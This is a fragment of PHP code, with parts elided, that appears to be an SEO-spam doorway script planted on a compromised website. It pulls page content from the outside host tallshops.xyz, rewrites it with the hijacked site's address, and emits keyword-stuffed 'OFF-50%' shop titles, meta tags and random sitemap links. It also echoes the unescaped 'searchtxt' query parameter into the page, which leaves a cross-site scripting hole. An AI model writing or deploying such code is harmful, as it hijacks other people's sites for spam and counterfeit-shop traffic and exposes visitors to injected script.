...
$pnum=mt_rand(1,99);
if(!($_GET['iid'])){
$url="http://tallshops.xyz/sjd.aspx?cid=".$cid."&number=2000&pnum=".$pnum;
$str=file_get_contents($url);
$str=str_replace('yymm', $http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 echo $str;
 exit();
...
<title><?php error_reporting(E_ALL^E_NOTICE^E_WARNING); echo $kname?>,OFF-<?php echo mt_rand(50,70)?>%,<?php echo $_SERVER['HTTP_HOST']?></title>
<meta name="keywords" content="<?php echo $kname?>,<?php echo $key?>,<?php echo $_GET['searchtxt']?>"/>
<meta name="description" content="<?php echo $kname?> Save on brand-name products with our best sales & deals at Our shop! Shop for Furniture, Bedding, Jewelry, Clothing, Shoes, Electronics & much more. <?php echo $key?>" />
...
$url=$hyzhdy."?iid=".$_GET['iid']."&mt=http://tallshops.xyz/en/333/".mt_rand(1,500).".txt&cid=".$_GET['cid'];
 ...
 $str=str_replace('DDDDD',$kname." Gold, White, Black, Red, Blue, Beige, Grey, Price, Rose, Orange, Purple, Green, Yellow, Cyan, Bordeaux, pink, Indigo, Brown, Silver,Electronics, Video Games, Computers, Cell Phones, Toys, Games, Apparel, Accessories, Shoes, Jewelry, Watches, Office Products, Sports & Outdoors, Sporting Goods, <ul><li>Related links: <a href='?s=s&cid=".mt_rand(1,40)."&number=4999'>sitemap01</a></li><li>Related links: <a href='?s=s&cid=".mt_rand(41,60)."&number=4999'>sitemap02</a></li><li>Related links: <a href='?s=s&cid=".mt_rand(61,79)."&number=4999'>sitemap03</a></li></ul>Baby Products, Health, Personal Care, Beauty, Home, Garden, Bed & Bath, Furniture, Tools, Hardware, Vacuums, Outdoor Living, Automotive Parts, Pet Supplies, Broadband, DSL, Books, Book Store, Magazine, Subscription, Music, CDs, DVDs, Videos,Online Shopping ".$key.$_GET['searchtxt'],$str);
 echo $str;
}
?> 
